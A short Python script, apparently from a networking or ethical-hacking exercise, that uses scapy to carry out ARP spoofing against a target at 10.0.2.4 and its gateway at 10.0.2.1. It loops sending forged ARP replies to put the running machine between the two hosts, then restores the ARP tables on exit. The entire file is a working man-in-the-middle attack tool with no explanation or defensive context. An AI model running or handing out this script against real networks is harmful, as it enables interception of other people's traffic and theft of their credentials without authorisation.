#!/usr/bin/env python

import scapy.layers.l2 as l2
import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = l2.ARP(pdst=ip)
    broadcast = l2.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = l2.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = l2.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"
try:
    packet_counter = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_counter = packet_counter + 1
        print("\rPackets sent: " + str(packet_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nExiting script. Restoring ARP tables, please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("Done.")
